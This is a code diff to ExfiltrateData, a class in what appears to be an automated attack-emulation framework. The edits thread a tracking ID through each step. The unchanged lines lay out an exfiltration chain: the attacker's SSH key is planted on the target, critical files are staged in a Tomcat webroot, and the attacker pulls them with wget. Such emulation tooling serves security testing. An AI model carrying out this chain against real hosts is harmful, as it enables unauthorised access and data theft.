@@ -21,6 +21,7 @@ from config.attacker_config import Environment
 
 class ExfiltrateData(HighLevelAction):
     def __init__(self, target_host: Host):
+        super().__init__()
         self.target_host = target_host
 
     async def run(
@@ -77,7 +78,7 @@ class ExfiltrateData(HighLevelAction):
 
     async def record_exfil_results(self, attack_agent, low_level_action_orchestrator):
         events = await low_level_action_orchestrator.run_action(
-            MD5SumAttackerData(attack_agent)
+            MD5SumAttackerData(attack_agent, self.id)
         )
         return events
 
@@ -88,7 +89,7 @@ class ExfiltrateData(HighLevelAction):
     ):
         # Get SSH key of attacker agent
         events = await low_level_action_orchestrator.run_action(
-            ReadFile(attacker_agent, "/root/.ssh/id_rsa.pub")
+            ReadFile(attacker_agent, "/root/.ssh/id_rsa.pub", self.id)
         )
         ssh_key_data = None
         for event in events:
@@ -106,7 +107,7 @@ class ExfiltrateData(HighLevelAction):
 
             # Add SSH key to target host
             await low_level_action_orchestrator.run_action(
-                AddSSHKey(target_agent, ssh_key_data)
+                AddSSHKey(target_agent, ssh_key_data, self.id)
             )
 
             for critical_filepath in file_paths:
@@ -131,6 +132,7 @@ class ExfiltrateData(HighLevelAction):
                         ssh_port,
                         critical_filepath,
                         filename,
+                        self.id,
                     )
                 )
 
@@ -188,6 +190,7 @@ class ExfiltrateData(HighLevelAction):
                             ssh_port=str(ssh_port),
                             src_filepath=critical_filepath,
                             dst_filepath=f"/opt/tomcat/webapps/ROOT/{filename}",
+                            high_level_action_id=self.id,
                         )
                     )
 
@@ -206,6 +209,7 @@ class ExfiltrateData(HighLevelAction):
                     wgetFile(
                         attacker_agent,
                         url=f"http://{ssh_host_ip}:{webserver_port}/{filename}",
+                        high_level_action_id=self.id,
                     )
                 )
 
@@ -218,7 +222,7 @@ class ExfiltrateData(HighLevelAction):
         for src_agent in source_host.agents:
             # Get SSH key of attacker agent
             events = await low_level_action_orchestrator.run_action(
-                ReadFile(src_agent, "~/.ssh/id_rsa.pub")
+                ReadFile(src_agent, "~/.ssh/id_rsa.pub", self.id)
             )
             ssh_key_data = None
             for event in events:
@@ -232,5 +236,5 @@ class ExfiltrateData(HighLevelAction):
             for target_agent in target_host.agents:
                 # Add SSH key to target host
                 await low_level_action_orchestrator.run_action(
-                    AddSSHKey(target_agent, ssh_key_data)
+                    AddSSHKey(target_agent, ssh_key_data, self.id)
                 )
